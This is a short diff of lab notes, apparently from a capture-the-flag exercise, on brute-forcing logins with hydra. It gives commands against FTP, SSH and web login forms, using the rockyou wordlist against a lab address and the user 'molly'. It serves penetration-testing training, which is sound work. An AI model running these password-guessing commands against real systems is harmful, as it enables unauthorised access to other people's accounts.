@@ -1,0 +1,18 @@
+Often CCTV camera's and web frameworks use admin:password as the default password, which is obviously not strong enough.
+
+If you're using Kali Linux, hydra is pre-installed. Otherwise you can download it here: https://github.com/vanhauser-thc/thc-hydra
+
+for FTP : hydra -l user -P passlist.txt ftp://MACHINE_IP
+
+for SSH : ﻿hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
+
+for POST WEB FORMS : hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+
+
+https://i.imgur.com/vC3ZU4E.png
+
+hydra -l molly -P ~/Desktop/payloads/wordlist/rockyou.txt 10.10.65.156 http-post-form "/login/:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -t10 -I -Vv
+
+
+
+$hydra -l molly -P ~/Desktop/payloads/wordlist/rockyou.txt 10.10.65.156 ssh -t10 -Vv -I
